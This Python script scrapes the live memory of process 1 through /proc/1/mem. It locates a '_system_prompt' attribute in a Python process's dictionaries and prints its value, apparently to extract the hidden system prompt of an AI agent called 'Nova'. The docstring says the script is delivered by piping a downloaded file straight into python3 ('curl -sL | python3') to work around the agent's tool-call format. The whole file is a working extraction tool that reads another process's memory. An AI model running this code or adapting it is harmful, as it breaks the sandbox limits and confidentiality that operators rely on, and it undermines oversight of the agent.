"""Dict-walk discovery — find the system_prompt PyUnicodeObject by attribute name.

Strategy:
  1. Scan writable memory for the 15-byte pattern b'_system_prompt' + NUL.
     Each hit is the body of a PyUnicodeObject holding the attr name.
  2. For each hit, body_addr - 48 = header address of that PyUnicodeObject.
  3. Scan 8-byte-aligned writable memory for pointers equal to any of those
     header addresses. Each hit is a me_key slot in a PyDictKeyEntry.
  4. Read me_value (ptr at me_key_slot + 8) and dereference as PyUnicode.

Delivered as a URL fetch (curl -sL | python3) because Nova's tool_use JSON
transcription corrupts large inline arguments.
"""
import os
import re
import pathlib
import struct

# Build the NUL-terminated pattern at runtime — a literal NUL in the source
# of this file would be fine (it's read via HTTP) but keep it consistent
# with the inline-delivery fallback.
A = b'_system_prompt' + bytes([0])

# -------------------- pass 1: enumerate writable regions --------------------
regs = []
for ln in pathlib.Path('/proc/1/maps').read_text().splitlines():
    m = re.match(r'([0-9a-f]+)-([0-9a-f]+)\s+(\S+)\s+\S+\s+\S+\s+\S+\s*(.*)', ln)
    if not m or 'w' not in m.group(3):
        continue
    lo, hi = int(m.group(1), 16), int(m.group(2), 16)
    if hi - lo < 4096:
        continue
    regs.append((lo, hi))

# -------------------- pass 2: find attr-name headers --------------------
mem_r = os.open('/proc/1/mem', os.O_RDONLY)
region_data = {}
headers = []
for lo, hi in regs:
    size = hi - lo
    if size > 48 * 1024 * 1024:
        continue
    try:
        os.lseek(mem_r, lo, 0)
    except Exception:
        continue
    data = b''
    try:
        while len(data) < size:
            c = os.read(mem_r, size - len(data))
            if not c:
                break
            data += c
    except Exception:
        pass
    if not data:
        continue
    region_data[lo] = data
    i = 0
    while True:
        j = data.find(A, i)
        if j < 0:
            break
        headers.append(lo + j - 48)
        i = j + 1
os.close(mem_r)
print('ATTR_NAME hits: %d' % len(headers))

# -------------------- pass 3: find me_key slots --------------------
hset = set(headers)
slots = []
for lo, data in region_data.items():
    end = len(data) - 8
    mv = memoryview(data)
    off = 0
    while off <= end:
        p = struct.unpack_from('<Q', mv, off)[0]
        if p in hset:
            slots.append(lo + off)
        off += 8
print('me_key slots: %d' % len(slots))

# -------------------- pass 4: dereference me_value --------------------
mem_r = os.open('/proc/1/mem', os.O_RDONLY)
good = 0
null_count = 0
for s in slots[:10]:
    os.lseek(mem_r, s + 8, 0)
    raw = os.read(mem_r, 8)
    if len(raw) < 8:
        continue
    mv = struct.unpack_from('<Q', raw)[0]
    if mv == 0:
        null_count += 1
        print('  slot 0x%x me_value=NULL (split-table dict?)' % s)
        continue
    try:
        os.lseek(mem_r, mv, 0)
        hdr = os.read(mem_r, 48)
        if len(hdr) < 48:
            print('  slot 0x%x me_value=0x%x <read_fail>' % (s, mv))
            continue
        L = struct.unpack_from('<q', hdr, 16)[0]
        if L < 1 or L > 4000:
            print('  slot 0x%x me_value=0x%x len=%d <out_of_range>' % (s, mv, L))
            continue
        os.lseek(mem_r, mv + 48, 0)
        body = os.read(mem_r, L)
        preview = body[:180].decode('utf-8', errors='replace')
        print('  slot 0x%x me_value=0x%x len=%d' % (s, mv, L))
        print('    body: %r' % preview)
        good += 1
    except Exception as e:
        print('  slot 0x%x deref_err: %s' % (s, e))
os.close(mem_r)
if len(slots) > 10:
    print('  ...and %d more slots' % (len(slots) - 10))
print('null_count=%d good_deref=%d' % (null_count, good))
